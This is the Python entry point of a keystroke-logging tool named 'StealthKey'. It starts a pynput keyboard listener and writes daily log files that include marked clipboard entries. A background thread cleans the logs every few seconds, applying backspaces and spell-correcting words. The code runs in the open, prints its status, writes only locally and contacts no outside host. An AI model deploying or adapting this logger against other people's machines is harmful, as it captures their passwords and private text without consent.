"""
Entry point for the StealthKey application. 
This script initializes the log creation system, starts the keyboard listener 
for capturing keystrokes, and launches a background thread to periodically 
clean and correct the spelling of the logged content.
"""

from pynput.keyboard import Listener
import threading
import os
import time, pynput, re, nltk
from nltk.corpus import names  # type: ignore

from stealthkey import write_to_file, on_release, set_log_file_getter, get_last_press_time # type: ignore
from spell_corrector import correct_text
from log_creator import start_log_creator, LogCreator

LOGS_FOLDER = "logs"

nltk.download('names', quiet=True)

# Load the NLTK names corpus into a set for fast lookup
try:
    NAME_DICTIONARY = set(n.lower() for n in names.words())
except Exception:
    # Fallback if corpus isn't downloaded yet
    NAME_DICTIONARY = set()

def apply_backspaces(text: str) -> str:
    """Processes backspaceKey tokens by deleting the preceding character."""
    token = "backspaceKey"
    while token in text:
        idx = text.find(token)
        # Part before the backspace
        before = text[:idx]
        # Part after the backspace
        after = text[idx + len(token):]
        # Remove the last character from 'before' if it exists
        text = (before[:-1] if before else "") + after
    return text

def periodic_text_corrector(log_creator: LogCreator):
    """
    Periodically reads the current log file, applies backspace processing, 
    removes technical noise, and performs spelling correction.
    
    Args:
        log_creator (LogCreator): An instance of the LogCreator class to 
                                  retrieve the active log file path.
    """
    last_deep_clean_timestamp = 0.0

    while True:
        if not os.path.exists(__file__):
            print("Script file deleted, stopping corrector.")
            break

        current_log = log_creator.get_current_log_file()
        last_press = get_last_press_time()
        now = time.time()
        
        if current_log and os.path.exists(current_log):
            try:
                with open(current_log, "r", encoding="utf-8") as file:
                    content = file.read()

                if not content:
                    time.sleep(5)
                    continue

                # Check for 30 seconds of inactivity to perform a "Deep Clean" from the timestamp
                is_inactivity_detected = (now - last_press > 30) and (last_deep_clean_timestamp < last_press)
                
                if is_inactivity_detected:
                    # Find the start of the current session (last timestamp)
                    # Timestamp format: DD-MM-YYYY HH:MM:SS AM/PM
                    ts_pattern = r'\n\d{2}-\d{2}-\d{4} \d{2}:\d{2}:\d{2} [AP]M \n'
                    matches = list(re.finditer(ts_pattern, content))
                    start_idx = matches[-1].end() if matches else 0
                    
                    header = content[:start_idx]
                    to_process = content[start_idx:]
                    active_buffer = ""
                    last_deep_clean_timestamp = now
                else:
                    # Standard 5s live correction: only process up to the last newline
                    last_newline_idx = content.rfind("\n") + 1
                    header = ""
                    to_process = content[:last_newline_idx]
                    active_buffer = content[last_newline_idx:]

                to_process = apply_backspaces(to_process)
                to_process = re.sub(r'\w+Key\+?\s*', '', to_process)

                lines = to_process.splitlines()
                processed_lines = []

                for line in lines:
                    if line.startswith("[CLIPBOARD]") or not line.strip():
                        processed_lines.append(line)
                    else:
                        words = line.split()
                        corrected_words = []
                        for word in words:
                            # Proper Noun Protection: If capitalized or matches your name, don't correct it.
                            if (word and word[0].isupper()) or word.lower() in NAME_DICTIONARY or word.lower() in ["rishabh", "joshi"]:
                                corrected_words.append(word)
                            else:
                                corrected_words.append(correct_text(word))
                        processed_lines.append(" ".join(corrected_words))

                # Filter out empty lines created by noise removal and join with single newlines
                final_output = "\n".join(processed_lines)

                with open(current_log, "w", encoding="utf-8") as file:
                    # Reconstruct the file: Header (previous sessions) + Processed Block + Active Buffer
                    file.write(header + final_output + "\n" + active_buffer)
                    
            except Exception as e:
                print(f"Error in periodic_text_corrector: {e}")

        time.sleep(5)  # Correct every 5 seconds for a "live" feel

def main():
    print("Starting StealthKey with daily log creation...")
    
    # Start log creator
    log_creator = start_log_creator(LOGS_FOLDER)
    print(f"Log folder created at: {LOGS_FOLDER}")
    print(f"Current log file: {log_creator.get_current_log_file()}")
    
    # Set the log file getter for StealthKey
    set_log_file_getter(log_creator.get_current_log_file) # type: ignore


    # Start StealthKey listener
    def on_press_wrapper(key: pynput.keyboard.Key):
        """
        Wrapper to handle the return value of write_to_file to satisfy type checkers.
        """
        return write_to_file(key)

    listener = Listener(on_press=on_press_wrapper, on_release=on_release) # type: ignore
    listener.start()
    print("StealthKey started. Press ESC to stop.")

    # Start the text correction and cleaning thread
    corrector_thread = threading.Thread(target=periodic_text_corrector, args=(log_creator,), daemon=True)
    corrector_thread.start()

    listener.join()

if __name__ == "__main__":
    main()
